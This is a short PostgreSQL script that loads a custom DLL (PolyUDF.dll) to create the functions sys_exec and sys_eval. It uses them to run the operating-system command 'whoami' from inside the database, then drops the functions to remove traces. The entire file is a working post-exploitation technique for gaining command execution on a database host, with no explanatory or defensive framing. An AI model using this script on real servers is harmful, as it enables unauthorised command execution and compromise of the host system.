CREATE OR REPLACE FUNCTION sys_cleanup()
  RETURNS int4 AS
E'C:\\Program Files\\PostgreSQL\\10\\bin\\PolyUDF.dll', 'sys_cleanup'
  LANGUAGE c VOLATILE STRICT
  COST 1;
ALTER FUNCTION sys_cleanup()
  OWNER TO postgres;

CREATE OR REPLACE FUNCTION sys_eval(text)
  RETURNS text AS
E'C:\\Program Files\\PostgreSQL\\10\\bin\\PolyUDF.dll', 'sys_eval'
  LANGUAGE c VOLATILE STRICT
  COST 1;
ALTER FUNCTION sys_eval(text)
  OWNER TO postgres;

CREATE OR REPLACE FUNCTION sys_exec(text)
  RETURNS int4 AS
E'C:\\Program Files\\PostgreSQL\\10\\bin\\PolyUDF.dll', 'sys_exec'
  LANGUAGE c VOLATILE STRICT
  COST 1;
ALTER FUNCTION sys_exec(text)
  OWNER TO postgres;

select sys_exec('whoami');
select sys_eval('whoami');
select sys_cleanup();

drop function sys_eval(text);
drop function sys_exec(text);
drop function sys_cleanup();
